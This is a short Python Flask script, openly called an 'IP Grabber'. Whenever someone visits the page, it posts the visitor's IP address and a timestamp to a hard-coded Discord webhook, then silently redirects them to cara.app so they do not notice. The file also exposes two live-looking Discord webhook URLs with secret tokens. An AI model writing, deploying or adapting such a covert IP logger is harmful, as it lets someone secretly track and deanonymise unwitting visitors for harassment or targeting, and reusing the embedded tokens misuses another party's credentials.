from flask import Flask, request, redirect
from datetime import datetime
import requests

app = Flask(__name__)

def send_ip(ip, date):
    # webhook_url = "https://discord.com/api/webhooks/1338081253852971008/OE1ciuaB02WgfhdTnY424UciiONK8wosndyGoNBI5UqcbhLUkFXwAfTqVZ_AvYEQGtd7" <-- voice channels make phone calls
    webhook_url = "https://discord.com/api/webhooks/1340617822145089546/elBRdyyzwfeZqgDVkTuKzKmY0QigoKMhO2gz_HAA5OBHexEhE04LeEyCE5ey34Q6Njpy"
    data = {
        "content": "",
        "title": "IP Logger"
    }
    data["embeds"] = [
        {
            "title": ip,
            "description": date
        }
    ]
    requests.post(webhook_url, json=data)  # This line needs to be indented

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")  # Fixed typo: strtime -> strftime
    
    send_ip(ip, date)
    return redirect("https://cara.app/explore")

if __name__ == "__main__":
    app.run(host='0.0.0.0')


# Flask to Discord IP Grabber ;)    
